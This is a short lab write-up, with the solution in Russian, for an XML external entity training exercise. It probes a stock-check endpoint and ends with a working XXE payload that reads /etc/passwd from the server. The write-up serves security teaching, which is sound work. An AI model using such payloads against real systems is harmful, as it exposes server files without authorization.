# Exploiting XXE using external entities to retrieve files
APPRENTICE

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.

## Решение
В описании сказано, что всё неожиданное выводится в ответ. Отловлю запрос и вместо единицы в productId отправлю строку "abc":
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>abc</productId>
<storeId>1</storeId>
</stockCheck>
```
Получаю ответ `"Invalid product ID: abc"`.

Объявлю сущность dummy со значением "hello" и попробую передать в качестве значения productId:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE productId [ <!ENTITY dummy "hello"> ]>
<stockCheck>
<productId>&dummy;</productId>
<storeId>1</storeId>
</stockCheck>
```
Получаю ответ `"Invalid product ID: hello"`. Отлично, сущности работают. Переделаю сущнсоть `dummy` на `<!ENTITY dummy SYSTEM "/etc/passwd">`:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE productId [ <!ENTITY dummy SYSTEM "/etc/passwd"> ]>
<stockCheck>
<productId>&dummy;</productId>
<storeId>1</storeId>
</stockCheck>
```
В ответе приходит содержимое файла "/etc/passwd". Задание выполнено.
